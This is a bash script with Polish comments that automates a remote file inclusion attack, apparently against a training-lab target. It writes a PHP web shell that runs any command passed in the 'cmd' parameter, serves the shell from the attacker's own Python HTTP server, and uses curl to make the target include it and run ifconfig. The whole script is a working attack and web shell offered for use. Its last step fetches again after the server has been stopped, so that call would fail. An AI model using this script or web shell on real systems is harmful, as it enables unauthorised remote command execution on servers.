#!/bin/bash

# Utwórz plik evil.php
echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > evil.php
echo "Plik evil.php został utworzony."

# Uruchom serwer HTTP Pythona
echo "Rozpoczynam serwer HTTP Pythona na porcie 80..."
python3 -m http.server 80 &

# Przechwytuj PID serwera HTTP na później
HTTP_SERVER_PID=$!

# Poczekaj chwilę, aż serwer się uruchomi
sleep 2

# Stwórz URL do dostarczenia payloadu
TARGET_URL="http://10.10.166.169/vulnerabilities/fi/?page=http://twój_adres_ip/evil.php"

echo "Dostarczam payload za pomocą URL-a: $TARGET_URL"

# Wykonaj polecenie za pomocą curl
CMD_URL="${TARGET_URL}&cmd=ifconfig"
echo "Wykonywanie polecenia ifconfig na serwerze docelowym..."
curl -s $CMD_URL

# Ubij serwer HTTP
kill $HTTP_SERVER_PID
echo "Serwer HTTP został zatrzymany."

# Wyświetl wynik
echo "Wynik z serwera docelowego:"
curl -s $CMD_URL
